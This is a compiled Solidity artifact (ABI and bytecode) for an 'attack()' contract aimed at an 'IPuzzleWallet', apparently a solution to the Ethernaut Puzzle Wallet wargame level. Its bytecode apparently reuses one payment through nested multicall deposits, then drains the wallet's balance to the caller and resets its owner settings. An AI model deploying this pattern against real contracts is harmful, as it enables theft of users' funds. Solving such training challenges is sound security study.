{"abi":[{"type":"constructor","inputs":[{"name":"_wallet","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"wallet","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IPuzzleWallet"}],"stateMutability":"view"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b506040516104e23803806104e2833981016040819052602b91604e565b5f80546001600160a01b0319166001600160a01b03929092169190911790556079565b5f60208284031215605d575f5ffd5b81516001600160a01b03811681146072575f5ffd5b9392505050565b61045c806100865f395ff3fe60806040526004361061002b575f3560e01c8063521eb273146100365780639e5faafc14610070575f5ffd5b3661003257005b5f5ffd5b348015610041575f5ffd5b505f54610054906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b61007861007a565b005b6040805160048152602481018252602080820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fd0e30db0000000000000000000000000000000000000000000000000000000001790528251600180825281850190945291925f929182015b60608152602001906001900390816100e657905050905081815f8151811061011057610110610360565b60209081029190910101526040515f90631592ca1b60e31b9061013790849060240161038d565b60408051601f19818403018152918152602080830180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff167fffffffff00000000000000000000000000000000000000000000000000000000959095169490941790935280516002808252606082019092529193505f9282015b60608152602001906001900390816101ae57905050905083815f815181106101d8576101d8610360565b602002602001018190525081816001815181106101f7576101f7610360565b60209081029190910101525f54604051631592ca1b60e31b81526001600160a01b039091169063ac9650d890349061023390859060040161038d565b5f604051808303818588803b15801561024a575f5ffd5b505af115801561025c573d5f5f3e3d5ffd5b50505f80546040517fb61d27f60000000000000000000000000000000000000000000000000000000081523360048201526001600160a01b039091168031602483015260606044830152606482019290925290935063b61d27f6925060840190505f604051808303815f87803b1580156102d4575f5ffd5b505af11580156102e6573d5f5f3e3d5ffd5b50505f546040517f9d51d9b70000000000000000000000000000000000000000000000000000000081523360048201526001600160a01b039091169250639d51d9b791506024015f604051808303815f87803b158015610344575f5ffd5b505af1158015610356573d5f5f3e3d5ffd5b5050505050505050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f602082016020835280845180835260408501915060408160051b8601019250602086015f5b8281101561041a57868503603f19018452815180518087525f5b818110156103e9576020818401810151898301820152016103cd565b505f602082890101526020601f19601f830116880101965050506020820191506020840193506001810190506103b3565b5092969550505050505056fea2646970667358221220c4e425423a94f0aa303fb3739d1234bb8635701d1b953b57f0becc75605babbf64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","wallet()":"521eb273"},"id":0}